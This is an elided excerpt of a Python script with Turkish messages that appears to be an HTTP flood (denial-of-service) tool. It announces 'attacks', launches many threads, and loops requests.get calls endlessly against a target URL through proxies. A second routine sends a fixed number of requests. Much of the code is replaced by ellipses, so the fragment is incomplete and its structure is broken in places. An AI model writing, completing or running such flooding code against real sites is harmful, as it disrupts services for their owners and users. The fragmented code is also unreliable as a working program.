...
def surekli_get():
    while True:
        ...
        print(Fore.LIGHTGREEN_EX + "Saldırıyı durdurmak için 'CTRL + C' tuşlarına basın.")
        print(Fore.LIGHTGREEN_EX + "---------------------------------------------------------------------")
        ...
        for i in range(3):
            print(Fore.LIGHTYELLOW_EX + f"{thread_sayisi} thread ile saldırı başlatılıyor ({3-i} saniye sonra)...")
            time.sleep(1)
        ...
        def thread_get(hedef, headers):
            while True:
                try:
                    r = requests.get(hedef, proxies=proxies, headers=headers, timeout=(5, 10))
        ...
        print(Fore.LIGHTCYAN_EX + "Saldırı başlatıldı! Programı durdurmak için CTRL+C'ye basın.")
        while True:
            time.sleep(1)
        ...
        def thread_miktarli_sureli_get(hedef, sure, miktar):
            for _ in range(miktar):
                ...
                if r.status_code == 200:
                    ...
                    print(Fore.LIGHTYELLOW_EX + "Bilinmeyen durum:", r.status_code)
                    break
            print(Fore.LIGHTYELLOW_EX + f"{miktar} adet istek gönderildi. çıkmak için CTRL+C'ye basın.")
